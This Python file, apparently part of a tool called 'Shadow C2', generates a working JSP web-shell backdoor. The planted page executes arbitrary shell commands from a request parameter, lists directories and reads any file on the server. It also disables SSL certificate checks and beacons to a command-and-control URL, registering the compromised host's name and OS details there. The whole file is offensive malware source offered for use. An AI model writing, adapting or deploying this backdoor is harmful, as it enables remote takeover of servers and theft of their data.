#!/usr/bin/env python3
"""Shadow C2 — JSP Payload Template"""

class JSPRawTemplate:
    def generate(self, c2_url: str, encryption_key: str) -> str:
        return f"""<%@ page import="java.util.*,java.io.*,java.net.*" %>
<%@ page import="javax.net.ssl.*" %>
<%
// Shadow C2 — JSP Backdoor
String c2Url = "{c2_url}";
String encKey = "{encryption_key}";

String execCmd(String cmd) {{
    try {{
        String os = System.getProperty("os.name").toLowerCase();
        String[] command;
        if(os.contains("win")) {{
            command = new String[]{{"cmd.exe", "/c", cmd}};
        }} else {{
            command = new String[]{{"/bin/sh", "-c", cmd}};
        }}
        Process p = Runtime.getRuntime().exec(command);
        BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
        StringBuilder sb = new StringBuilder();
        String line;
        while((line = br.readLine()) != null) {{
            sb.append(line).append("\\n");
        }}
        // Also capture stderr
        br = new BufferedReader(new InputStreamReader(p.getErrorStream()));
        while((line = br.readLine()) != null) {{
            sb.append(line).append("\\n");
        }}
        p.waitFor();
        return sb.toString();
    }} catch(Exception e) {{
        return "[!] Exec failed: " + e.getMessage();
    }}
}}

String httpPost(String urlStr, String data) {{
    try {{
        // Disable SSL verification
        TrustManager[] trustAll = new TrustManager[]{{
            new X509TrustManager() {{
                public java.security.cert.X509Certificate[] getAcceptedIssuers() {{ return null; }}
                public void checkClientTrusted(java.security.cert.X509Certificate[] c, String a) {{}}
                public void checkServerTrusted(java.security.cert.X509Certificate[] c, String a) {{}}
            }}
        }};
        SSLContext sc = SSLContext.getInstance("SSL");
        sc.init(null, trustAll, new java.security.SecureRandom());
        HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());

        URL url = new URL(urlStr);
        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
        conn.setRequestMethod("POST");
        conn.setDoOutput(true);
        conn.setRequestProperty("Content-Type", "application/json");
        conn.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36");
        conn.setConnectTimeout(10000);
        conn.setReadTimeout(30000);

        OutputStream os2 = conn.getOutputStream();
        os2.write(data.getBytes("UTF-8"));
        os2.flush();
        os2.close();

        BufferedReader br = new BufferedReader(new InputStreamReader(conn.getInputStream()));
        StringBuilder sb = new StringBuilder();
        String line;
        while((line = br.readLine()) != null) sb.append(line);
        return sb.toString();
    }} catch(Exception e) {{
        return "";
    }}
}}

String action2 = request.getParameter("_action");
if(action2 == null) action2 = "";

String output2 = "";

switch(action2) {{
    case "exec":
        String cmd = request.getParameter("cmd");
        output2 = execCmd(cmd != null ? cmd : "id");
        break;
    case "ls":
        String path2 = request.getParameter("path");
        if(path2 == null) path2 = ".";
        File dir = new File(path2);
        StringBuilder lsOut = new StringBuilder();
        if(dir.isDirectory()) {{
            for(File f : dir.listFiles()) {{
                lsOut.append(f.isDirectory() ? "[D] " : "[F] ");
                lsOut.append(f.getName());
                lsOut.append(" (").append(f.length()).append(")\\n");
            }}
        }}
        output2 = lsOut.toString();
        break;
    case "read":
        String rp = request.getParameter("path");
        output2 = new String(java.nio.file.Files.readAllBytes(java.nio.file.Paths.get(rp)));
        break;
    case "info":
        output2 = "OS: " + System.getProperty("os.name") + " " + System.getProperty("os.version") + "\\n";
        output2 += "Arch: " + System.getProperty("os.arch") + "\\n";
        output2 += "Java: " + System.getProperty("java.version") + "\\n";
        output2 += "User: " + System.getProperty("user.name") + "\\n";
        output2 += "Home: " + System.getProperty("user.home") + "\\n";
        break;
    default:
        // Beacon
        String uuid = (String) session.getAttribute("uuid");
        if(uuid == null) {{
            uuid = java.util.UUID.randomUUID().toString();
            session.setAttribute("uuid", uuid);
            String info = "{{\\"uuid\\":\\"" + uuid + "\\",\\"hostname\\":\\"" +
                java.net.InetAddress.getLocalHost().getHostName() +
                "\\",\\"os\\":\\"" + System.getProperty("os.name") +
                "\\",\\"arch\\":\\"" + System.getProperty("os.arch") +
                "\\",\\"php_version\\":\\"JSP/Java " + System.getProperty("java.version") + "\\"}}";
            httpPost(c2Url + "/api/register", info);
        }}
        httpPost(c2Url + "/api/beacon",
            "{{\\"uuid\\":\\"" + uuid + "\\",\\"timestamp\\":\\"" + System.currentTimeMillis() + "\\"}}");
        break;
}}

if(!output2.isEmpty()) {{
    response.setContentType("text/plain");
    out.print(java.util.Base64.getEncoder().encodeToString(output2.getBytes("UTF-8")));
}}
%>"""
